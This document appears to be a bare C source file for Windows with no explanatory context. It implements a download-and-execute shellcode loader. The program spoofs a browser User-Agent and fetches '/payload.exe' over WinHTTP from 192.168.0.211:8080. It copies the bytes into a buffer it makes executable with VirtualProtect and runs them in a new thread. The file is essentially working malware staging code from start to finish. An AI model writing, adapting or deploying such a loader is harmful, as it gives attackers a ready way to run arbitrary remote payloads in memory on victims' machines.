#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

int main() {

    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL bResults;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR OutBuffer;
    char* buffer = NULL;
    DWORD totalSize = 0;
    int option;

    hInternet = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hInternet) {
        printf("[!] WinHttpOpen Error %lu\n", GetLastError());
        goto end;
    }

    hConnect = WinHttpConnect(hInternet, L"192.168.0.211", 8080, 0);
    if (!hConnect) {
        printf("[!] WinHttpConnect Error: %lu\n", GetLastError());
        goto end;
    }

    hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/payload.exe", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        printf("[!] WinHttpOpenRequest Error: %lu\n", GetLastError());
        goto end;
    }

    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bResults) {
        printf("[!] WinHttpSendRequest Error: %lu\n", GetLastError());
        goto end;
    }

    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        printf("[!] WinHttpReceiveResponse Error: %lu\n", GetLastError());
        goto end;
    }

    printf("[+] Successfully connected \n");

    buffer = (char*)VirtualAlloc(NULL, 20000000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        printf("[!] VirtualAlloc Error: %lu\n", GetLastError());
        goto end;
    }

    do {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
            printf("[!] WinHttpQueryDataAvailable Error: %lu\n", GetLastError());
            goto end;
        }

        if (dwSize == 0)
            break;

        OutBuffer = (LPSTR)VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!OutBuffer) {
            printf("[!] VirtualAlloc Error: %lu\n", GetLastError());
            break;
        }

        if (!WinHttpReadData(hRequest, (LPVOID)OutBuffer, dwSize, &dwDownloaded)) {
            printf("[!] WinHttpReadData Error: %lu\n", GetLastError());
            VirtualFree(OutBuffer, 0, MEM_RELEASE);
            break;
        }

        memcpy(buffer + totalSize, OutBuffer, dwDownloaded);
        totalSize += dwDownloaded;

        VirtualFree(OutBuffer, 0, MEM_RELEASE);
    } while (dwSize > 0);

    printf("[i] Payload stored at 0x%p\n", buffer);

    if (buffer) {
        printf("[i] Total Size: %u\n", totalSize);
        printf("Downloaded Content in Hex (300 bytes):\n");
        for (DWORD i = 0; i < 300; i++) {
            printf("%02x ", (unsigned char)buffer[i]);
        }
        printf("\n");

            DWORD OldProtection = NULL;    
            if (!VirtualProtect(buffer, totalSize, PAGE_EXECUTE_READWRITE, &OldProtection))
            {
                printf("[!] VirtualProtect Failed with Error: %d \n", GetLastError());
                return -1;
            }
            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);

            if (hThread == NULL)
            {
                printf("[!] CreateThread Failed with Error: %d \n", GetLastError());
                return -1;
            }
            WaitForSingleObject(hThread, INFINITE);

        }else{
        printf("Error with the buff");
        }
end:
    if (hRequest)
        WinHttpCloseHandle(hRequest);
    if (hConnect)
        WinHttpCloseHandle(hConnect);
    if (hInternet)
        WinHttpCloseHandle(hInternet);

    return 0;
}
